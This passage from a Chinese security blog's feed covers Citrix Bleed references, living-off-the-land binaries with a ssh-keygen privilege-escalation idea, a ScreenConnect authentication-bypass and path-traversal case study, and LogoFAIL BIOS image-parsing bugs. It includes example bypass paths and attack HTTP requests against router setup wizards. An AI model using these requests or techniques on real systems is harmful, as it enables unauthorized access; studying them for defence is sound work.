href="https://paper.seebug.org/269/" target="_blank" rel="noopener">实战栈溢出：三个漏洞搞定一台路由器</a> / <a href="https://web.archive.org/web/20170610035343/http://paper.seebug.org/269/" target="_blank" rel="noopener">备份存档</a></li><li><a href="https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">CVE-2023-4966 citrix 内存泄漏</a> / <a href="https://web.archive.org/web/20240311132549/https://bestwing.me/CVE-2023-4966-Citrix-memory-leak.html" target="_blank" rel="noopener">备份存档</a></li></ol><p>解释一下引用上面几篇文章的原因：</p><ol><li>GitHub Security Lab 的文章，很好的解释了与 <code>snprintf</code> 有关的 <code>2</code> 个注意事项</li><li>GitHub Security Lab 的文章，和前一篇差不多</li><li>Assetnote 的文章，可能是最早公开 Citrix Bleed 细节的文章（<strong>未考证</strong>）</li><li>长亭科技的一篇老文章，不仅说明了历史在不断重复，也说明了历史惊人的相似性</li><li>长亭科技一名员工的博客，引用这篇文章单纯是因为他也提到长亭的前一篇文章</li></ol><p><strong>如果你想复现这个漏洞，但是由于客观原因无法顺利搭建复现环境，可以联系我免费获取 Tips，节约时间和金钱 :P</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Citrix Bleed 漏洞（CVE-2023-4966）相关的几篇参考文档&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Citrix" scheme="https://programlife.net/tags/Citrix/"/>
    
      <category term="snprintf" scheme="https://programlife.net/tags/snprintf/"/>
    
  </entry>
  
  <entry>
    <title>Living Off the Land Techniques</title>
    <link href="https://programlife.net/2024/03/03/living-off-the-land-techniques/"/>
    <id>https://programlife.net/2024/03/03/living-off-the-land-techniques/</id>
    <published>2024-03-03T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Living off the Land</strong> (<strong>LOTL</strong>) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as <strong>LOLBins</strong>, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.</p></blockquote><a id="more"></a><h2 id="0x01-Living-off-the-Land"><a href="#0x01-Living-off-the-Land" class="headerlink" title="0x01. Living off the Land"></a>0x01. Living off the Land</h2><p>Living off the Land，按照信达雅的翻译可以理解为“<strong>靠山吃山，靠水吃水</strong>” :P</p><p>几个收集此类信息的网站如下：</p><ol><li>Unix - <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li><li>Windows - <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a></li><li>macOS - <a href="https://www.loobins.io/" target="_blank" rel="noopener">https://www.loobins.io/</a></li><li>Windows Drivers - <a href="https://www.loldrivers.io/" target="_blank" rel="noopener">https://www.loldrivers.io/</a></li></ol><p>最后一个（Windows 驱动）和 BYOVD 是一个意思，即 <strong>Bring Your Own Vulnerable Driver</strong>，目前恶意软件常用的提权方式之一。DefCon 27 上有个专门讲怎么挖掘和利用第三方驱动程序漏洞的议题《<a href="https://media.defcon.org/DEF CON 27/DEF CON 27 presentations/DEFCON-27-Jesse-Michael-Get-off-the-kernel-if-you-cant-drive.pdf" target="_blank" rel="noopener">Defcon 27: Get off the Kernel if you can’t Drive</a>》。</p><p><img src="/uploads/202403/Get-Off-The-Kernel-If-You-Cannot-Drive.webp" alt="Defcon 27: Get off the Kernel if you can&#39;t Drive"></p><p>CISA (<em>Cybersecurity and Infrastructure Security Agency</em>) 防御指引：</p><ol><li><a href="https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques</a></li><li><a href="https://www.cisa.gov/sites/default/files/2024-02/Joint-Guidance-Identifying-and-Mitigating-LOTL_V3508c.pdf" target="_blank" rel="noopener">Identifying and Mitigating Living Off the Land Techniques - PDF</a></li></ol><h2 id="0x02-ssh-keygen-提权案例"><a href="#0x02-ssh-keygen-提权案例" class="headerlink" title="0x02. ssh-keygen 提权案例"></a>0x02. ssh-keygen 提权案例</h2><p>参考：<a href="https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html" target="_blank" rel="noopener">Leveraging ssh-keygen for Arbitrary Execution (and Privilege Escalation)</a></p><p>并不是说 <code>ssh-keygen</code> 本身存在提权问题，而是说在可以以 <code>root</code> 权限运行该程序的场景下（比如 <code>sudoers</code> 配置、SUID 设置等），可以利用该程序来加载指定的动态库（<code>-D</code> 选项）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ man ssh-keygen</span><br><span class="line">SSH-KEYGEN(1)             BSD General Commands Manual               SSH-KEYGEN(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">     ssh-keygen — OpenSSH authentication key utility</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">[...]</span><br><span class="line">     ssh-keygen -D pkcs11</span><br><span class="line">[...]</span><br><span class="line">     -D pkcs11</span><br><span class="line">             Download the public keys provided by the PKCS#11 shared library pkcs11.</span><br><span class="line">             When used in combination with -s, this option indicates that a CA key</span><br><span class="line">             resides in a PKCS#11 token (see the CERTIFICATES section for details).</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>原文提到了两种思路：</p><ol><li>在目标机器上搜索一个可以 <code>exec /bin/sh</code> 的候选动态库，然后通过十六进制编辑器、反汇编器（Ghidra 或 IDA）、patchelf 等，对其进行 Patch 操作</li><li>自己写一个（只需要写一个 <code>constructor</code> 函数即可），本地交叉编译后上传</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Living off the Land&lt;/strong&gt; (&lt;strong&gt;LOTL&lt;/strong&gt;) involves the abuse of native tools and processes on systems, especially living off the land binaries, often referred to as &lt;strong&gt;LOLBins&lt;/strong&gt;, to blend in with normal system activities and operate discreetly with a lower likelihood of being detected or blocked because these tools are already deployed and trusted in the environment.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Red Teaming" scheme="https://programlife.net/categories/Red-Teaming/"/>
    
    
      <category term="LOTL" scheme="https://programlife.net/tags/LOTL/"/>
    
      <category term="LOLBins" scheme="https://programlife.net/tags/LOLBins/"/>
    
      <category term="BYOVD" scheme="https://programlife.net/tags/BYOVD/"/>
    
  </entry>
  
  <entry>
    <title>漏洞案例研究 ConnectWise ScreenConnect Authentication Bypass</title>
    <link href="https://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/"/>
    <id>https://programlife.net/2024/02/25/connectwise-screenconnect-authentication-bypass/</id>
    <published>2024-02-25T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近 ConnectWise ScreenConnect 爆了 2 个漏洞（CVE-2024-1709 和 CVE-2024-1708），其中 <strong>CVE-2024-1709</strong> 是一个 Authentication Bypass 漏洞，CVSS 评分 10 分。Sophos 安全团队表示，勤劳的攻击者已经在第一时间利用这些漏洞来投递勒索软件。本文简单整理相关信息，作为漏洞案例研究系列的第一篇文章。</p><a id="more"></a><h2 id="0x01-为什么在这水文章"><a href="#0x01-为什么在这水文章" class="headerlink" title="0x01. 为什么在这水文章"></a>0x01. 为什么在这水文章</h2><p>笔者最近的工作方向开始转向产品安全蓝军，当前主要工作包括：代码审计、安全攻防、垂类恶意软件检测。</p><p>一方面，代码审计和之前做二进制漏洞挖掘在思路上比较类似，最重要的熟知各种<strong>漏洞模式</strong>（或者说攻击面）。就好比 Integer Overflow，挖掘思路就是找到各个内存分配点，然后看参数是否是经过某些算术运算而来，最后是这些参数是否是攻击者可以控制的，其实也就是污点分析的思路。也不难理解<strong>漏洞模式</strong>其实类似<strong>设计模式</strong>，是一套总结出来的方法论。</p><p>另一方面，真正的 RCE 漏洞往往是攻击者最喜欢的漏洞，比如本文提到的 ConnectWise ScreenConnect Authentication Bypass 漏洞 CVE-2024-1709，以及去年还算比较火的 Citrix Bleed 漏洞 CVE-2023-4966，都被攻击者用来投递勒索软件，在 ATT&amp;CK 框架中被归类为 <strong>Initial Access</strong>。而在黑市上，就有专门从事这类操作的组织，被称之为 <strong>Initial Access Broker</strong>（IAB），他们利用漏洞或者钓鱼等手段来获取各种系统的权限，然后将权限倒卖给其他组织（比如勒索软件团伙）。</p><p>鉴于此，笔者决定对这类漏洞进行简单的分析、整理和归类，以便日后在工作中作为参考。</p><h2 id="0x02-CVE-2024-1709"><a href="#0x02-CVE-2024-1709" class="headerlink" title="0x02. CVE-2024-1709"></a>0x02. CVE-2024-1709</h2><p>在漏洞模式上，暂且将这个漏洞归类为 Setup Wizard 类型。</p><h3 id="2-1-漏洞原理"><a href="#2-1-漏洞原理" class="headerlink" title="2.1 漏洞原理"></a>2.1 漏洞原理</h3><p>Huntress 安全团队通过补丁对比分析，给出了漏洞的细节信息。</p><p>首先是 <code>ScreenConnect\SetupWizard.aspx</code> 的变化：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>a2</span><br><span class="line">&gt; &lt;%@ Implements Interface=<span class="string">"ScreenConnect.ISetupHandler"</span> %&gt;</span><br><span class="line"><span class="number">5</span>a7,<span class="number">14</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnInit</span>(<span class="params">EventArgs e</span>)</span></span><br><span class="line"><span class="function">&gt;</span>     &#123;</span><br><span class="line">&gt;         <span class="keyword">base</span>.OnInit(e);</span><br><span class="line">&gt;</span><br><span class="line">&gt;         <span class="keyword">if</span> (SetupModule.IsSetup)</span><br><span class="line">&gt;             <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">"Already setup"</span>);</span><br><span class="line">&gt;     &#125;</span><br></pre></td></tr></table></figure><p>此外，<code>ScreenConnect\Bin\ScreenConnect.Web.dll</code> 中，<code>ScreenConnect.SetupModule</code> 中 <code>OnBeginRequest</code> 变成了 <code>OnPostMapRequestHandler</code>，如下所示：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnPostMapRequestHandler</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HttpContext context = ((HttpApplication)sender).Context;</span><br><span class="line">    <span class="keyword">string</span> text = context.Response.ApplyAppPathModifier(ConfigurationCache.SetupPage);</span><br><span class="line">    <span class="keyword">bool</span> flag = context.Handler <span class="keyword">is</span> ISetupHandler || <span class="comment">// --&gt; 新增条件</span></span><br><span class="line">                <span class="keyword">string</span>.Equals(context.Request.Path, text, StringComparison.OrdinalIgnoreCase); <span class="comment">// --&gt; 之前可绕过</span></span><br><span class="line">    <span class="keyword">if</span> (!ConfigurationCache.IsSetup)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ConfigurationCache.AllowRemoteSetup &amp;&amp; !context.Request.IsLocal)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is in setup mode and is only accessible from local machine."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag &amp;&amp; Regex.IsMatch(context.Request.Path, ConfigurationCache.SetupRedirectFilter))</span><br><span class="line">        &#123;</span><br><span class="line">            context.Response.Redirect(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ConfigurationCache.AlreadySetupPage == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">403</span>, <span class="string">"Application is already setup."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">string</span> url = context.Response.ApplyAppPathModifier(ConfigurationCache.AlreadySetupPage);</span><br><span class="line">        context.Response.Redirect(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，对于 <code>SetupWizard.aspx</code> 的访问，上面这段代码原本已经有了相关检查逻辑，但是对 URL Path 的判断在旧版本中是可以绕过的。因为 .NET 有个奇怪的特性：请求的 URL Path 后面竟然还可以附加额外的信息！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: http://www.contoso.com/virdir/page.html/tail</span><br><span class="line">FilePath: /virdir/page.html</span><br><span class="line">PathInfo: /tail</span><br><span class="line">Path: FilePath + PathInfo = /virdir/page.html/tail</span><br></pre></td></tr></table></figure><p>也就是说，<code>context.Request.Path</code> 可以是 <code>/SetupWizard.aspx/literallyanything</code>，因此访问 <code>/SetupWizard.aspx/</code> 即可触发漏洞。在这个页面可以重新设置管理员账号密码，之后直接重置和覆盖原有的数据库。</p><h3 id="2-2-类似漏洞"><a href="#2-2-类似漏洞" class="headerlink" title="2.2 类似漏洞"></a>2.2 类似漏洞</h3><p><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">Drive-By Compromise: A Tale Of Four Wifi Routers</a> 给出了一个路由器上的类似漏洞：路由器初始化设置页面（Setup Wizard）在已经设置过的情况下，无需授权仍然可以再次访问，因此可以通过钓鱼来实现管理员账号重置，比如受害者访问攻击者控制的网页时自动发送如下 HTTP 请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="tag">&lt;<span class="name">HTTP</span> <span class="attr">headers</span> <span class="attr">redacted</span> <span class="attr">for</span> <span class="attr">brevity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">page=sysinit&amp;newpass=<span class="tag">&lt;<span class="name">attacker-supplied</span> <span class="attr">password</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">Trendnet AC2600 TEW-827DRU Multiple Vulnerabilities</a> 也有一个 Setup Wizard 相关的漏洞案例：</p><blockquote><p><strong>Information Disclosure via Setup Wizard -</strong> <strong>CVE-2021-20150</strong></p><p>Authentication can be bypassed and a user may view information as Admin by manually browsing to the setup wizard and forcing it to redirect to the desired page. The following is an example request:</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /apply_sec.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.10.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 107</span><br><span class="line">Origin: http://192.168.10.1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.10.1/setup_wizard.asp</span><br><span class="line">Cookie: compact_display_state=false</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">action=setup_wizard_cancel&amp;html_response_page=client_status.asp&amp;html_response_return_page=client_status.asp</span><br></pre></td></tr></table></figure><p>通过 Setup Wizard 实现未授权访问特定页面。</p><h2 id="0x03-CVE-2024-1708"><a href="#0x03-CVE-2024-1708" class="headerlink" title="0x03. CVE-2024-1708"></a>0x03. CVE-2024-1708</h2><p>这是一个 Zip 解压场景下的路径穿越漏洞。</p><p><code>ScreenConnect.Core.dll</code> 补丁对比：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11057</span>c11057</span><br><span class="line">&lt;         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath</span>)</span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function">&gt;         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExtractAllEntries</span>(<span class="params"><span class="keyword">string</span> basePath, <span class="keyword">string</span> requireEntriesInMoreStringentPath = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">11062c11062</span></span><br><span class="line"><span class="function">&lt;                 FileSystemExtensions.<span class="title">DemandInParentPath</span>(<span class="params">basePath, text</span>)</span>;</span><br><span class="line">---</span><br><span class="line">&gt;                 FileSystemExtensions.DemandInParentPath(requireEntriesInMoreStringentPath ?? basePath, text);</span><br></pre></td></tr></table></figure><p><code>ScreenConnect.Server.dll</code> 补丁对比：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8392</span>a8393</span><br><span class="line">&gt;             DirectoryInfo extensionsDirectory = GetExtensionsDirectory();</span><br><span class="line"><span class="number">8398</span>c8399</span><br><span class="line">&lt;             zipFile.ExtractAllEntries(GetExtensionsDirectory().FullName);</span><br><span class="line">---</span><br><span class="line">&gt;             zipFile.ExtractAllEntries(extensionsDirectory.FullName, extensionDirectory.FullName);</span><br></pre></td></tr></table></figure><p>利用这个漏洞可以实现一层目录穿越，即插件 X 的文件，可以解压到插件 Y 的目录下，但不会穿越出大的插件目录 <code>ScreenConnect\App_Extensions</code>。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>两类漏洞：</p><ul><li>Setup Wizard 未授权访问漏洞</li><li>Zip 解压路径穿越漏洞</li></ul><h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol><li><a href="https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/" target="_blank" rel="noopener">https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/</a></li><li><a href="https://attack.mitre.org/tactics/TA0001/" target="_blank" rel="noopener">https://attack.mitre.org/tactics/TA0001/</a></li><li><a href="https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass" target="_blank" rel="noopener">https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/dotnet/api/system.web.httprequest.path?view=netframework-4.8.1</a></li><li><a href="https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/" target="_blank" rel="noopener">https://blog.includesecurity.com/2021/09/drive-by-compromise-a-tale-of-four-routers/</a></li><li><a href="https://www.tenable.com/security/research/tra-2021-54" target="_blank" rel="noopener">https://www.tenable.com/security/research/tra-2021-54</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近 ConnectWise ScreenConnect 爆了 2 个漏洞（CVE-2024-1709 和 CVE-2024-1708），其中 &lt;strong&gt;CVE-2024-1709&lt;/strong&gt; 是一个 Authentication Bypass 漏洞，CVSS 评分 10 分。Sophos 安全团队表示，勤劳的攻击者已经在第一时间利用这些漏洞来投递勒索软件。本文简单整理相关信息，作为漏洞案例研究系列的第一篇文章。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Authentication Bypass" scheme="https://programlife.net/tags/Authentication-Bypass/"/>
    
      <category term="Path Traversal" scheme="https://programlife.net/tags/Path-Traversal/"/>
    
  </entry>
  
  <entry>
    <title>BlackHat Europe 2023 议题学习（二）</title>
    <link href="https://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/"/>
    <id>https://programlife.net/2024/01/28/BHEU-2023-Learning-Part2/</id>
    <published>2024-01-28T13:33:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>BlackHat Europe 2023 - <a href="https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042" target="_blank" rel="noopener">LogoFAIL: Security Implications of Image Parsing During System Boot</a></p><p>BlackHat USA 2009 - <a href="https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf" target="_blank" rel="noopener">Attacking Intel® BIOS</a> - PDF</p><a id="more"></a><h2 id="0x01-议题简介"><a href="#0x01-议题简介" class="headerlink" title="0x01. 议题简介"></a>0x01. 议题简介</h2><p>《LogoFAIL: Security Implications of Image Parsing During System Boot》这个议题主要介绍 BIOS 启动时 Logo 图片解析相关的漏洞，顺便提及了 2009 年的一个类似的议题《Attacking Intel® BIOS》，也是 BIOS 启动时 BMP 解析导致的整数溢出漏洞。所以，作者也感叹 History Repeats Itself。</p><p>在漏洞挖掘过程中，攻击面的挖掘是一个很重要的点，如果能找到大家（厂商、安全研究员、攻击者）都没怎么关注过的攻击面，极有可能收获一波 Low Hanging Fruits。</p><h2 id="0x02-Attacking-Intel-BIOS"><a href="#0x02-Attacking-Intel-BIOS" class="headerlink" title="0x02. Attacking Intel BIOS"></a>0x02. Attacking Intel BIOS</h2><h3 id="2-1-研究思路"><a href="#2-1-研究思路" class="headerlink" title="2.1 研究思路"></a>2.1 研究思路</h3><p>更新 BIOS 固件时，固件包必须有合法的数字签名，作者的思路是看看有没有不需要签名的数据，在这部分数据上做研究。而 BIOS 的 Logo 图片便满足这一条件，在启动的早期阶段，图片会被解析和展示，这就来到了经典的文件格式解析问题。</p><h3 id="2-2-漏洞案例"><a href="#2-2-漏洞案例" class="headerlink" title="2.2 漏洞案例"></a>2.2 漏洞案例</h3><p>解析 BMP 图片格式时，存在经典的整数溢出漏洞。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EFI_STATUS <span class="title">ConvertBmpToGopBlt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">if</span> (BmpHeader-&gt;CharB != <span class="string">'B'</span> || BmpHeader-&gt;CharM != <span class="string">'M'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> EFI_UNSUPPORTED;</span><br><span class="line">    &#125;</span><br><span class="line">    BltBufferSize = BmpHeader-&gt;PixelWidth * BmpHeader-&gt;PixelHeight</span><br><span class="line">        * <span class="keyword">sizeof</span> (EFI_GRAPHICS_OUTPUT_BLT_PIXEL);</span><br><span class="line">    IsAllocated = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (*GopBlt == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *GopBltSize = BltBufferSize;</span><br><span class="line">        *GopBlt = EfiLibAllocatePool(*GopBltSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为触发了整数溢出，会导致向目标缓冲区写入大量数据，直到访问到未映射的内存页，触发 Page Fault 异常。作者的利用思路是，在溢出的过程中改写 Page Fault Exception Handler，让其跳转到 BMP 图片中的执行 Shellcode。利用思路如下：</p><p><img src="/uploads/202401/BMP-Parsing-Integer-Overflow-Exploit.webp" alt="BMP 解析整数溢出漏洞利用"></p><h2 id="0x03-LogoFAIL"><a href="#0x03-LogoFAIL" class="headerlink" title="0x03. LogoFAIL"></a>0x03. LogoFAIL</h2><p>研究思路和前面是完全一致的，发现 UEFI 固件会解析如下图片格式：BMP、GIF、PNG、JPEG、PCX 以及 TGA。作者在仿真的环境下做了一些基于 LibAFL 的 Fuzzing。</p><h3 id="3-1-漏洞案例"><a href="#3-1-漏洞案例" class="headerlink" title="3.1 漏洞案例"></a>3.1 漏洞案例</h3><p>BMP 解析缓冲区下溢漏洞。</p><p><img src="/uploads/202401/BMP-Parsing-Buffer-Underflow.webp" alt="BMP 解析缓冲区下溢漏洞"></p><p>JPEG 解析内存破坏漏洞（未校验 Huffman Table 个数）。</p><p><img src="/uploads/202401/JPEG-Parsing-HT-Memory-Corruption.webp" alt="JPEG 解析内存破坏漏洞"></p><p>PNG 解析整数溢出漏洞。</p><p><img src="/uploads/202401/PNG-Parsing-Integer-Overflow.webp" alt="PNG 解析整数溢出漏洞"></p><h3 id="3-2-种子文件"><a href="#3-2-种子文件" class="headerlink" title="3.2 种子文件"></a>3.2 种子文件</h3><p>PCX 是一种上古时期的文件格式，现在基本没人用了，作者在 Internet Archive 上找到了一个压缩包下载连接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.org/details/Universe_Of_PCX_1700_PCX_Files</span><br></pre></td></tr></table></figure><p>笔者在过去的工作中也做过 PCX Fuzzing，不过都是 Google 上找的少量零星的样本🤣。</p><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>攻击面挖掘是重点，老议题也值得回顾（可以开阔思路）。当然，LogoFAIL 中的研究也是有较高门槛的，在当前的国内环境下，一般的公司很可能是不会给这个时间去研究的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BlackHat Europe 2023 - &lt;a href=&quot;https://www.blackhat.com/eu-23/briefings/schedule/index.html#logofail-security-implications-of-image-parsing-during-system-boot-35042&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;LogoFAIL: Security Implications of Image Parsing During System Boot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;BlackHat USA 2009 - &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Attacking Intel® BIOS&lt;/a&gt; - PDF&lt;/p&gt;
    
    </summary>
    
      <category term="Conferences" scheme="https://programlife.net/categories/Conferences/"/>
    
      <category term="BlackHat" scheme="https://programlife.net/categories/Conferences/BlackHat/"/>
    
    
      <category term="BIOS" scheme="https://programlife.net/tags/BIOS/"/>
    
      <category term="File Format Fuzzing" scheme="https://programlife.net/tags/File-Format-Fuzzing/"/>
    
      <category term="Internet Archive" scheme="https://programlife.net/tags/Internet-Archive/"/>
    
